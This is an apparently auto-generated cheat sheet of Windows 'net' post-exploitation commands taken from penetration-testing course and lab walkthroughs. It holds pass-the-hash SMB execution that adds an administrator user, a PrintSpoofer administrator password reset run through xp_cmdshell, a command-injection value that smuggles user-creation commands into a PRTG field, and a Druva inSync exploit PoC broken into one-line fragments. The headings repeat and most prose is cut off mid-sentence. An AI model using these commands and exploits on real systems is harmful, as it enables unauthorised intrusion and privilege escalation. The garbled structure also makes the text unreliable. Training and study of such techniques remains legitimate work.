# Windows net commands

% net, windows, cpts

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - exemple-attacking-a-dc
#cat/POSTEXPLOIT #cpts
Once connected, we can check to see what privileges bwilliamson has. We can start with looking at the local group membership using the command:

```
net localgroup
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - exemple-attacking-a-dc-2
#cat/POSTEXPLOIT #cpts
We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want

```
net user bwilliamson
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - smb
#cat/POSTEXPLOIT #cpts
[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

```
cd C:\tools\Invoke-TheHash\
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - smb-2
#cat/POSTEXPLOIT #cpts
[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

```
Import-Module .\Invoke-TheHash.psd1
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - smb-3
#cat/POSTEXPLOIT #cpts
[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

```
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - listing-domain-groups
#cat/POSTEXPLOIT #cpts
Living Off the Land

```
The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o
#cat/POSTEXPLOIT #cpts
Students can now use `PrintSpoofer.exe` to run commands as SYSTEM. One option is to catch a reverse shell, or, add a new admin user. However, students will find the simplest way forward is simply to change the password f

```
xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-2
#cat/POSTEXPLOIT #cpts
```
SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - submit-the-contents-of-the-flagtxt-file-on-the-administrator-desktop-o-3
#cat/POSTEXPLOIT #cpts
Now, students must refer to the `Bloodhound` data to identify the final phase of the attack chain. The CT059 user has `GenericAll` rights over the Domain Admins group: `Bloodhound` also provides instructions on how to ab

```
net user administrator Welcome1 /domain
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - what-domain-user-is-explicitly-listed-as-a-member-of-the-local-adminis
#cat/POSTEXPLOIT #cpts
Using the same `RDP` session established from the previous question, students need to run `PowerShell` as administrator then run the `net localgroup` on `Administrators`; students will find out that the domain user that

```
net localgroup Administrators
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - what-domain-user-is-explicitly-listed-as-a-member-of-the-local-adminis-2
#cat/POSTEXPLOIT #cpts
```
Alias name Administrators
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - attack-the-prtg-target-and-gain-remote-code-execution-submit-the-conte
#cat/POSTEXPLOIT #cpts
From the previous question, students know that `PRTG` is running on port 8080, therefore, they need to navigate to `https://STMIP:8080` and login using the credentials `prtgadmin:Password123`: Students then need to hover

```
test.txt; net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - get-all-users
#cat/POSTEXPLOIT #cpts
Knowing what other users are on the system is important as well. If we gained RDP access to a host using credentials we captured for a user `bob`, and see a `bob_adm` user in the local administrators group, it is worth c

```
cmd-session
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - confirming-new-admin-user
#cat/POSTEXPLOIT #cpts
If all went to plan, we will have a new local admin user under our control. Adding a user is "noisy," We would not want to do this on an engagement where stealth is a consideration. Furthermore, we would want to check wi

```
User name hacker
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - druva-insync-powershell-poc
#cat/POSTEXPLOIT #cpts
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```
$ErrorActionPreference = "Stop"
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - druva-insync-powershell-poc-2
#cat/POSTEXPLOIT #cpts
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```
$cmd = "net user pwnd /add"
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - druva-insync-powershell-poc-3
#cat/POSTEXPLOIT #cpts
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```
$s = New-Object System.Net.Sockets.Socket(
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - druva-insync-powershell-poc-4
#cat/POSTEXPLOIT #cpts
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```
$s.Connect("127.0.0.1", 6064)
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - druva-insync-powershell-poc-5
#cat/POSTEXPLOIT #cpts
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - druva-insync-powershell-poc-6
#cat/POSTEXPLOIT #cpts
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - druva-insync-powershell-poc-7
#cat/POSTEXPLOIT #cpts
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd")
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - druva-insync-powershell-poc-8
#cat/POSTEXPLOIT #cpts
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```
$length = [System.BitConverter]::GetBytes($command.Length)
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - druva-insync-powershell-poc-9
#cat/POSTEXPLOIT #cpts
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```
$s.Send($header)
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - druva-insync-powershell-poc-10
#cat/POSTEXPLOIT #cpts
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```
$s.Send($rpcType)
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - druva-insync-powershell-poc-11
#cat/POSTEXPLOIT #cpts
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```
$s.Send($length)
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - druva-insync-powershell-poc-12
#cat/POSTEXPLOIT #cpts
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```
$s.Send($command)
```

## Windows net commands - Windows net commands - Windows net commands - Windows net commands - Windows net commands - escalate-privileges-on-the-ms01-host-and-submit-the-contents-of-the-fl
#cat/POSTEXPLOIT #cpts
With the GUI access over RDP, students now need to escalate privileges through the `SysaxAutomation` application; to do so, students need to create a batch script (named "pwn.bat", in here) in the directory `C:\Users\ilf

```
net localgroup administrators ilfserveradm /add
```

